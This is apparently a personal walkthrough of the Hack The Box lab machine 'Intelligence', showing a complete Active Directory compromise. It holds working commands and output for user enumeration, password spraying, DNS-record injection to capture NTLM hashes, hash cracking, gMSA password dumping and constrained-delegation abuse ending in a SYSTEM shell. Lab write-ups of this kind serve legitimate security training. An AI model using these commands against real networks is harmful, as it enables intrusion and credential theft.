# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.10.248
nmap -sU --top-ports=10 -vv 10.10.10.248

---OUTPUT---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-14 04:02:27Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
| aWdlbmNlMRswGQYDVQQDExJpbnRlbGxpZ2VuY2UtREMtQ0EwHhcNMjEwNDE5MDA0
| MzE2WhcNMjIwNDE5MDA0MzE2WjAeMRwwGgYDVQQDExNkYy5pbnRlbGxpZ2VuY2Uu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCX8Wz5Z7/hs1L9f
| F3QgoOIpTaMp7gi+vxcj8ICORH+ujWj+tNbuU0JZNsviRPyB9bRxkx7dIT8kF8+8
| u+ED4K38l8ucL9cv14jh1xrf9cfPd/CQAd6+AO6qX9olVNnLwExSdkz/ysJ0F5FU
| xk+l60z1ncIfkGVxRsXSqaPyimMaq1E8GvHT70hNc6RwhyDUIYXS6TgKEJ5wwyPs
| s0VFlsvZ19fOUyKyq9XdyziyKB4wYIiVyptRDvst1rJS6mt6LaANomy5x3ZXxTf7
<SNIP>
| 1ilJEh2sEXnps/RYH+N/j7QojPZDvUeM7ZMefR5IFAcnYNZb6TfAPnnpNgdhgsYN
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-14T04:03:48+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-14T04:03:48+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-14T04:03:48+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
<SNIP>
| 1ilJEh2sEXnps/RYH+N/j7QojPZDvUeM7ZMefR5IFAcnYNZb6TfAPnnpNgdhgsYN
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-14T04:03:48+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMaW50ZWxs
<SNIP>
| 2urpaMc2At5qjf6pwyKYLxjBit1jcX6TmEgB/uaE/L9Py2mqyC7p1r40V1FxSGbE
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 4953/tcp): CLEAN (Timeout)
|   Check 2 (port 55306/tcp): CLEAN (Timeout)
|   Check 3 (port 21343/udp): CLEAN (Timeout)
|   Check 4 (port 49263/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-14T04:03:08
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

```
## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://10.10.10.248 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/documents/]
/Documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/Documents/]
```
		- Next Directory
			- tried documents but nothing
	- VHost :
		```bash

```
- Ffuf : nothing
	```bash
ffuf
```
## Website Enumeration and Initial Foothold
### Direct
- Basic web page but **there are 2 download files**
	- we see the file name in the url is in the format `&Y-&M-&d-upload.pdf` from 1st jan 2020
		- Maybe there are more files like that
- We pass this command in bash to pass a simple code to generate the string to brute force.
	- using the date command we can create a tiny script generating a list of filenames we can enumerate:
		```bash
date
date --date="1 day ago" 
date --date="1 day ago" +%Y-%m-%d
date --date="1 day ago" +%Y-%m-%d-upload.pdf
# now we need to get it to the year of the file we found (2020)
date --date="1929 day ago" +%Y-%m-%d-upload.pdf #currently to 1 Jan 2020
date --date="1564 day ago" +%Y-%m-%d-upload.pdf #currently to 31 Dec 2020

```
	- We will have a date for the whole year and we wget the file from the website:
		```bash
---CREATE-LIST---
for i in $(seq 1564 1929); do date --date="$i days ago"  +%Y-%m-%d-upload.pdf; done > brutepdf.txt
---TEST-BEFORE-EXPLOIT---
for i in $(cat ../brutepdf.txt); do echo http://10.10.10.248/documents/$i; done # test
---EXPLOIT---
for i in $(cat ../brutepdf.txt); do wget http://10.10.10.248/documents/$i; done
```
		- We download the files.
	- We then use exiftool and find there is an entry Creator with a username so we create a list of users with this:
		```bash
exiftool *.pdf
---RELEVANT-OUTPUT---
Creator                         : Jason.Patterson
----
exiftool * | grep "Creator"
exiftool * | grep "Creator" | awk '{print $3}' > userlist.txt
```
		- Awk is to select the 3rd column form the entry (first two being Creator and :)
- We install kerbrute to enumerate if any users exist:
	```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb userlist.txt

---OUTPUT---

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/14/25 - Ronnie Flathers @ropnop

2025/04/14 06:27:00 >  Using KDC(s):
2025/04/14 06:27:00 >   10.10.10.248:88

2025/04/14 06:27:00 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
<SNIP>
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
<SNIP>
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2025/04/14 06:27:00 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2025/04/14 06:27:00 >  Done! Tested 84 usernames (84 valid) in 0.162 seconds

```
- Now we need a password.
	- We convert the pdf to text files so we can grep them.
		- This requires pdftotext to be installed:
			```bash
for i in $(ls); do pdftotext $i; done
cat *.txt | grep "password" -B5 -A5 # 5 lines before and after

--TO-FIND-WHICH-FILE---
for i in $(ls *.txt); do echo $i;grep -i password $i; done

---OUTPUT-1---
Sit porro tempora porro etincidunt adipisci.


New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.


Dolor quisquam aliquam amet numquam modi.
Sit porro tempora sit adipisci porro sit quiquia. Ut dolor modi magnam ipsum
velit magnam. Ipsum ut numquam tempora sit. Tempora eius est voluptatem.
Dolorem numquam consectetur etincidunt etincidunt sed. Neque magnam ipsum modi sit aliquam amet. Amet consectetur modi quisquam adipisci aliquam

---OUTPUT-2---
2020-06-04-upload.txt
Please login using your username and the default password of:
After logging in please change your password as soon as possible.

```
- We then use kerbrute to password spray:
	```bash
sudo ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.248 -d intelligence.htb userlist.txt NewIntelligenceCorpUser9876

---OUTPUT---
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/13/25 - Ronnie Flathers @ropnop

2025/04/13 22:39:41 >  Using KDC(s):
2025/04/13 22:39:41 >   10.10.10.248:88

2025/04/13 22:39:42 >  [+] VALID LOGIN WITH ERROR:       Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876    (Clock skew is too great)                                                             
2025/04/13 22:39:42 >  [+] VALID LOGIN WITH ERROR:       Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876    (Clock skew is too great)                                                             
2025/04/13 22:39:42 >  Done! Tested 84 logins (2 successes) in 0.675 seconds

```
	- We get credentials for user Tiffany.Molina
- We test with smbclient (winrm didnt work):
	```bash
smbclient -U 'Tiffany.Molina' -L //10.10.10.248/Users
Password for [WORKGROUP\Tiffany.Molina]: NewIntelligenceCorpUser9876

---OUTPUT---
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```
- We try to connect to Users with our credentials:
	```bash
smbclient //10.10.10.248/Users -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'
>dir

```
	- We see it is basically the C:\users location.
		- We can access Tiffany's folder and so e navigate to Desktop and grab the user flag.
			```bash
cd Tiffany.Molina\Desktop\
more user.txt
-OR-
get user.txt
exit
cat user.txt # form local machine
```
## BloodHound
- At this point we can also grab the bloodhound files we require from our target for better analysis.
- We grab the required files from target to add to bloodhound:
	```bash
bloodhound-python --dns-tcp -ns 10.10.10.248 -d intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -c all
```
	- We add the files to bloodhound
- We mark Tiffany as owned
	- But we don't see any path from tiffany
- In our SMB client however we did see the user Ted.Graves
	- Maybe we can compromise Ted which is a high value target that could lead us to another high value target SVC_INT$@INTELLIGENCE.HTB
		- This is probably a machine account (cant brute force pwd, too big)
		- it is a Group Managed Service Account (GMS)
		- We also see a user Laura.Lee who might have similar privileges to Ted and they are both a member of IT Support group.
			- This group I believe can read the pwd of SVC_INT$ user which has a link to the DC
- We continue enumerating with BloodHound at each step
### Lateral Movement
### Back to SMB Share
- We also see a powershell application in IT share
	```bash
smbclient //10.10.10.248/IT -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'
>dir

---OUTPUT---
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
```
	- we get it
		```bash
get downdetector.ps1
exit
cat downdetector.ps1

---OUTPUT---
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
		- Runs every 5 min
		- Checks the DNS entry and gets any host with a name starting with web.
			- Then it invokes a web request with **Default Credentials** to that host and if it fails to respond with 200 OK, a messag is sent to Ted Graces one of our high value targets.
- In AD due to dynamic DNS (if not hardened) almost any authenticated user can create a domain entry.
	- When you get a DHCP request, the machine updates the AD to create reverse lookup and all
- **NEW TOOL** : We can do this with a tool called dnstool. It will create a DNS entry from our machine to our target. We will then listen on that port on our network interface to grab the credentials:
	- part of krbrelayx as its part of a relay attack
		- https://github.com/dirkjanm/krbrelayx
		```bash
python3 dnstool.py -u "intelligence\Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r webrocknrj.intelligence.htb -a add -t A -d 10.10.14.25 10.10.10.248

---OUTPUT---
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
		- To test we can listen on port 80 using netcat and we should get some response in a few minutes
		- We can also test with nslookup:
			```bash
nslookup
server 10.10.10.248
webrocknrj.intelligence.htb

---OUTPUT-SERVER---
Default server: 10.10.10.248
Address: 10.10.10.248#5
---WEBOCKNRJ---
Server:         10.10.10.248
Address:        10.10.10.248#53

```
		- If responder doesn't work we can try msfdb
			```bash
sudo msfdb run
use auxilary/server/capture/http ntlm
auxilary(server/capture/http ntlm) > show options
auxilary(server/capture/http ntlm) > set SRVPORT 80
SRVPORT => 80
auxilary(server/capture/http ntlm) > set URIPATH /
URIPATH => /
auxilary(server/capture/http ntlm) > set SRVHOST 10.10.14.25
SRVHOST => 10.10.14.25
auxilary(server/capture/http ntlm) > show options # to check
auxilary(server/capture/http ntlm) > set JOHNPWFILE intelligence
run
```
		- If didn't set in verbose mode can also check for some activity here incase msfconsole causes an error we don't see:
			```bash
sudo tcpdump -i tun0 port 80 -n -vvv
```
	- If we check our responder entry:
		```bash
curl 10.10.14.25 -v

---OUTPUT---
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html
< Server: Microsoft-IIS/10.0
< Date: Tue, 15 Apr 2025 00:45:11 GMT
< WWW-Authenticate: Negotiate
< WWW-Authenticate: NTLM
< Content-Length: 1264
```
		- We see we request to authenticate with NTLM so we are trying to capture this authentication.
	- We then use a responder to listen on our network interface and end up grabbing Ted Grave's hash
		```bash
sudo responder -I tun0

---OUTPUT---
[+] Listening for events...                                                                            

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:0dd86db73709aaff:73497C69226067BF04C9F446B5577914:0101000000000000AB203FD28CADDB010DC97C965B44F6920000000002000800320050003700540001001E00570049004E002D00480033005100480031003400580044005700560056000400140032005000370054002E004C004F00430041004C0003003400570049004E002D00480033005100480031003400580044005700560056002E0032005000370054002E004C004F00430041004C000500140032005000370054002E004C004F00430041004C000800300030000000000000000000000000200000712A96C3BE13FE3C26B79F006BF4285791397C463F6054A137DBB319FA780BF70A001000000000000000000000000000000000000900400048005400540050002F0077006500620072006F0063006B006E0072006A002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```
	- We copy the hash into a file and attempt to crack it with john:
		```bash
vi tedgraves.hash # copy hash here
john tedgraves.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Mr.Teddy         (Ted.Graves)
```
		- We get Ted's credentials and can test it out with smbclient
			- We don't find anything interesting in Ted's Users folder.
## Privilege Escalation
- We then check bloodhound:
	- We mark Ted as Owned and check the Shortest Path to Domain Admins
		- We see Ted is a part of ITSupport Group which can read the GMS Password of user SVC_INT$
- We use gMSADumper.py
	- We clone the repo: https://github.com/micahvandeusen/gMSADumper.git
	- Then we pass the command :
		```bash
python gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'

---OUTPUT---
 > DC$
 > itsupport
svc_int$:::b05dfb2636385604c6d36b0ca61e35cb
svc_int$:aes256-cts-hmac-sha1-96:77a2141a0d0b64a8858ff6eac44a82cb388161b70a0ee4557566f4a6fc2091aa
svc_int$:aes128-cts-hmac-sha1-96:e9b3d6e223cd226f04fb91aaf759765d
```
	- We obtain the hash of SVC_INT$
		- `b05dfb2636385604c6d36b0ca61e35cb`
	- We try impacket psexec into it but we get authentified but nothing else:
		```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:b05dfb2636385604c6d36b0ca61e35cb 'svc_int$@10.10.10.248'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.248.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'IT' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
```
- On checking BloodHound again we see SVC_INT$ has AllowedToDelegate Privileges on our DC.
	- The constrained delegation primitive allows a principal to authenticate as any user to specific services on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host
		- This is as long as the user is not in the Protected Users security group.
- We can exploit this via impacket-getST tool:
	```bash
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' 'intelligence.htb/svc_int$' -hashes :b05dfb2636385604c6d36b0ca61e35cb

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```
	- Similar to Silver Ticket but it's not...it's S4U2Proxy
	- We get a ticket impersonating Adminsitrator
		- We can assign this as the KRB5CCNAME and try to login using this ticket using psexec or wmiexec (it should use the KRB5CCNAME we exported):
			```bash
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
impacket-psexec -k -no-pass dc.intelligence.htb


---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file THtDGTkB.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service wrLZ on dc.intelligence.htb.....
[*] Starting service wrLZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
		- We log in as Administrator user.
